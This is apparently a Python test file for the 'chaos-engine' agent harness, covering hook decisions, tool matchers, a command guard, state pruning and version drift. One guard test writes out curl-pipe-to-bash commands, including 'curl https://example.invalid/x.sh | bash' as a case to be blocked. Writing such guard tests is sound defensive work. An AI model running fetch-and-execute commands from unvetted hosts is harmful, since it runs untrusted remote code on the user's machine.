            self.assertEqual("continue", json.loads(owing.stdout).get("decision"))
            for reason in ("USER_CANCELED", "ERROR", "MAX_TOKEN_BUDGET_EXCEEDED"):
                stopped = self._agy(
                    project,
                    agents,
                    "Stop",
                    {
                        "conversationId": "s-stop",
                        "hookEventName": "Stop",
                        "cwd": str(project),
                        "terminationReason": reason,
                    },
                )
                self.assertEqual(0, stopped.returncode, stopped.stderr)
                self.assertNotEqual(
                    "continue", json.loads(stopped.stdout).get("decision"), reason
                )
            idle = self._agy(
                project,
                agents,
                "Stop",
                {
                    "conversationId": "s-stop",
                    "hookEventName": "Stop",
                    "cwd": str(project),
                    "fullyIdle": False,
                },
            )
            self.assertEqual(0, idle.returncode, idle.stderr)
            self.assertNotEqual("continue", json.loads(idle.stdout).get("decision"))

    def test_adopter_session_start_locators_resolve_under_overlay(self):
        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary)
            agents = self._overlay_project(project)
            self.assertFalse((project / "companions").exists())
            started = self._agy(
                project,
                agents,
                "SessionStart",
                {
                    "conversationId": "s-start",
                    "hookEventName": "SessionStart",
                    "cwd": str(project),
                    "workspacePaths": [str(project)],
                },
            )
            self.assertEqual(0, started.returncode, started.stderr)
            message = started.stdout
            self.assertIn(".chaos-engine/companions/ethics-card.md", message)
            self.assertIn(".chaos-engine/references/token-budget-modes.md", message)
            self.assertNotIn("Ethics: `companions/ethics-card.md`", message)

    def test_matchers_are_scoped_and_postinvocation_is_not_a_spawn(self):
        document = self.surfaces.antigravity_hooks_document()
        spec = document["chaos-engine"]
        preventive = spec["PreToolUse"][0]["matcher"]
        observational = spec["PostToolUse"][0]["matcher"]
        self.assertNotEqual(".*", preventive)
        self.assertNotEqual(".*", observational)
        self.assertIn("run_command", preventive)
        self.assertIn("run_workflow", preventive)
        self.assertIn("swarm", preventive)
        self.assertNotIn("PostInvocation", spec)
        merged = self.surfaces.merge_antigravity_hooks(
            {
                "chaos-engine": {
                    "PostInvocation": [
                        {
                            "type": "command",
                            "command": "python3 .chaos-engine/hooks/launch.py antigravity PostInvocation",
                        }
                    ],
                    "Stop": [
                        {
                            "type": "command",
                            "command": "./foreign-stop.sh",
                        }
                    ],
                }
            }
        )
        owned = merged["chaos-engine"]
        self.assertNotIn("PostInvocation", owned)
        self.assertEqual("./foreign-stop.sh", owned["Stop"][0]["command"])

    def test_published_install_sh_one_liner_is_allowed(self):
        guard = _load("ce_agy_guard_published", ROOT / "hooks" / "guard.py")
        source = (ROOT / "hooks" / "guard.py").read_text(encoding="utf-8")
        self.assertNotIn('"sha" + "fthq', source)
        command = (
            'curl -fsSL "https://raw.githubusercontent.com/ShaftHQ/chaosengine-harness/main/install.sh"'
            " | bash -s -- "
            '"https://raw.githubusercontent.com/ShaftHQ/chaosengine-harness/main/install.sh"'
        )
        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary)
            subprocess.run(["git", "init"], cwd=project, check=True, capture_output=True)
            subprocess.run(
                ["git", "remote", "add", "origin", "https://dev.azure.com/example/project/_git/consumer"],
                cwd=project,
                check=True,
                capture_output=True,
            )
            self.assertTrue(guard.documented_installer_for_project(command, project))
            self.assertFalse(
                guard.documented_installer_for_project("curl https://example.invalid/x.sh | bash", project)
            )

    def test_orphaned_host_receipts_matching_real_names_are_pruned(self):
        mindset = _load("ce_agy_mindset", ROOT / "runtime" / "harness_mindset.py")
        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary)
            state = project / ".chaos-engine-state"
            state.mkdir()
            (project / ".chaos-engine-hosts.json").write_text("{}\n", encoding="utf-8")
            aged = state / "orphaned-hosts-receipt.json"
            aged_hex = state / "orphaned-hosts-receipt-ab12.json"
            young = state / "orphaned-hosts-receipt-ffff.json"
            aged.write_text("{}\n", encoding="utf-8")
            aged_hex.write_text("{}\n", encoding="utf-8")
            young.write_text("{}\n", encoding="utf-8")
            scratch = state / "session-scratch" / "old"
            scratch.mkdir(parents=True)
            (scratch / "notes.jsonl").write_text("{}\n", encoding="utf-8")
            fresh = state / "session-scratch" / "fresh"
            fresh.mkdir()
            now = time.time()
            old = now - (8 * 24 * 60 * 60)
            for path in (aged, aged_hex, scratch / "notes.jsonl"):
                os.utime(path, (old, old))
            os.utime(scratch, (old, old))
            os.utime(young, (now, now))
            os.utime(fresh, (now, now))
            result = mindset.prune_orphaned_host_entries(project, now=now)
            self.assertIn("orphaned-hosts-receipt.json", result["removed"])
            self.assertIn("orphaned-hosts-receipt-ab12.json", result["removed"])
            self.assertFalse(aged.exists())
            self.assertFalse(aged_hex.exists())
            self.assertTrue(young.exists())
            self.assertTrue((project / ".chaos-engine-hosts.json").exists())
            self.assertFalse(scratch.exists())
            self.assertTrue(fresh.exists())

    def test_session_scratch_prune_unlinks_a_symlink_without_removing_its_target(self):
        mindset = _load("ce_agy_mindset_symlink", ROOT / "runtime" / "harness_mindset.py")
        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary)
            target = project / "live-target"
            target.mkdir()
            (target / "keep.txt").write_text("keep\n", encoding="utf-8")
            link = project / ".chaos-engine-state" / "session-scratch" / "linked"
            link.parent.mkdir(parents=True)
            link.symlink_to(target, target_is_directory=True)
            now = time.time()
            old = now - (8 * 24 * 60 * 60)
            os.utime(target, (old, old))
            os.utime(target / "keep.txt", (old, old))
            os.utime(link, (old, old), follow_symlinks=False)
            result = mindset.prune_orphaned_host_entries(project, now=now)
            self.assertIn("linked", result["removed"])
            self.assertFalse(link.is_symlink())
            self.assertTrue((target / "keep.txt").is_file())
            self.assertEqual("keep\n", (target / "keep.txt").read_text(encoding="utf-8"))

    def test_session_scratch_prune_keeps_a_directory_with_a_fresh_file(self):
        mindset = _load("ce_agy_mindset_fresh", ROOT / "runtime" / "harness_mindset.py")
        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary)
            session = project / ".chaos-engine-state" / "session-scratch" / "active"
            session.mkdir(parents=True)
            note = session / "notes.jsonl"
            note.write_text("{}\n", encoding="utf-8")
            now = time.time()
            old = now - (8 * 24 * 60 * 60)
            os.utime(session, (old, old))
            os.utime(note, (now, now))
            result = mindset.prune_orphaned_host_entries(project, now=now)
            self.assertNotIn("active", result["removed"])
            self.assertEqual("{}\n", note.read_text(encoding="utf-8"))

    def test_core_commit_drift_is_reported_when_version_matches(self):
        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary)
            overlay = project / ".chaos-engine"
            overlay.mkdir()
            (overlay / "VERSION").write_text("0.4.20261115.5\n", encoding="utf-8")
            (overlay / "manifest.json").write_text(
                json.dumps({"schemaVersion": 1, "source": {"commit": "a" * 40, "kind": "git"}}),
                encoding="utf-8",
            )
            (project / "VERSION").write_text("0.4.20261115.5\n", encoding="utf-8")
            (project / ".chaos-engine-hosts.json").write_text(
                json.dumps({"schemaVersion": 1, "phase": "installed", "coreCommit": "b" * 40}),
                encoding="utf-8",
            )
            detail = self.install._core_commit_drift_detail(project, overlay)
            self.assertIn("a" * 40, detail)
            self.assertIn("b" * 40, detail)
            (project / ".chaos-engine-hosts.json").write_text(
                json.dumps({"schemaVersion": 1, "phase": "installed", "coreCommit": "a" * 40}),
                encoding="utf-8",
            )
            self.assertEqual("", self.install._core_commit_drift_detail(project, overlay))

    def test_core_commit_drift_ignores_unrelated_consumer_version(self):
        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary)
            overlay = project / ".chaos-engine"
            overlay.mkdir()
            (overlay / "VERSION").write_text("0.4.20261115.5\n", encoding="utf-8")
            (overlay / "manifest.json").write_text(
                json.dumps({"schemaVersion": 1, "source": {"commit": "a" * 40, "kind": "git"}}),
                encoding="utf-8",
            )
            (project / "VERSION").write_text("2.5.0\n", encoding="utf-8")
            (project / ".chaos-engine-hosts.json").write_text(
                json.dumps({"schemaVersion": 1, "phase": "installed", "coreCommit": "b" * 40}),
                encoding="utf-8",
            )
            detail = self.install._core_commit_drift_detail(project, overlay)
            self.assertIn("coreCommit drift while VERSION matches", detail)
            self.assertIn("a" * 40, detail)
            self.assertIn("b" * 40, detail)


if __name__ == "__main__":
    unittest.main()
